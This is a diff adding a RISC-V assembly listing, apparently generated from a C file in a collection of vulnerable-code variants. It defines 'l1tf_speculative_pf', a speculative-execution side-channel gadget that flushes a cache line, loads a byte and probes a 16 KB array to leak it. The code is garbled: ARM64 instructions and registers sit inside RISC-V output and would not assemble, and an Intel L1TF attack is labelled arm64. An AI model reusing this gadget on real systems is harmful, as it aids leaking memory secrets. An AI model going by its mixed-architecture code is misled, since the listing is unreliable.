@@ -1,0 +1,45 @@
+	.file	"l1tf_pf_arm64_gen_1.c"
+	.option nopic
+	.attribute arch, "rv64i2p1_m2p0_a2p1_f2p2_d2p2_c2p0_zicsr2p0_zifencei2p0_zmmul1p0_zaamo1p0_zalrsc1p0_zca1p0_zcd1p0"
+	.attribute unaligned_access, 0
+	.attribute stack_align, 16
+	.text
+	.align	1
+	.globl	l1tf_speculative_pf
+	.type	l1tf_speculative_pf, @function
+l1tf_speculative_pf:
+	addi	sp,sp,-16
+	sd	ra,8(sp)
+ #APP
+# 3 "c_vulns/c_code/enhanced_variants/l1tf_pf_arm64_gen_1.c" 1
+	dsb sy; isb
+# 0 "" 2
+ #NO_APP
+	lui	a5,%hi(probe)
+	addi	a5,a5,%lo(probe)
+ #APP
+# 7 "c_vulns/c_code/enhanced_variants/l1tf_pf_arm64_gen_1.c" 1
+	dc civac, a0
+	dsb sy
+	
+	nop
+	nop
+	ldrb w0, [a0]
+	lsl x0, x0, #6
+	ldr x1, [a5, x0]
+	
+# 0 "" 2
+ #NO_APP
+	ld	ra,8(sp)
+	addi	sp,sp,16
+	jr	ra
+	.size	l1tf_speculative_pf, .-l1tf_speculative_pf
+	.globl	probe
+	.bss
+	.align	3
+	.type	probe, @object
+	.size	probe, 16384
+probe:
+	.zero	16384
+	.ident	"GCC: (GNU) 16.1.0"
+	.section	.note.GNU-stack,"",@progbits
